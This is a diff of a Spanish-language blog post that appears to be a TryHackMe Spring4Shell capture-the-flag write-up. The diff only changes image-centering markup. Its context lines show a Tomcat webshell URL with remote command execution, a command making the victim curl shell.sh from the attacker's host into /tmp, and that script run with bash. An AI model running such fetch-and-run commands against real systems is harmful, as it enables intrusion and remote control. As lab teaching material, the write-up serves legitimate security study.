@@ -15,7 +15,7 @@ tags:
   - Spring4shell
 ---
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/spring4shell/inicio.png">
 </p>
 
@@ -114,7 +114,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 En el navegador accedemos a la IP bajo el puerto 8080 y procedemos a descargar el archivo **exploit.zip**.
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/spring4shell/exploitzip.png">
 </p>
 
@@ -150,10 +150,10 @@ Your shell can be found at: http://10.10.25.142/tomcatwar.jsp?pwd=thm&cmd=whoami
 
 Como indica la salida del script, la webshell ha sido cargada en el servidor con éxito, por lo tanto, ya tenemos la **capacidad** de ejecutar comandos de manera remota.
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/spring4shell/vulnerable.png">
 </p>
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/spring4shell/intrusion.png">
 </p>
 
@@ -179,7 +179,7 @@ Ejecutaremos en el navegador la siguiente **URL** para cargar nuestra shell en l
 
 * http://10.10.25.142/tomcatwar.jsp?pwd=thm&cmd=curl http://10.9.3.40:8000/shell.sh -o /tmp/shell.sh
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/spring4shell/shell.png">
 </p>
 
@@ -196,7 +196,7 @@ Procedemos a ejecutar el archivo en el servidor víctima.
 
 * http://10.10.25.142/tomcatwar.jsp?pwd=thm&cmd=bash /tmp/shell.sh
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/spring4shell/admin.png">
 </p>
 
@@ -229,7 +229,7 @@ THM{NjAyNz
 
 **¡Ya está!** 
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/spring4shell/finish.png">
 </p>
 
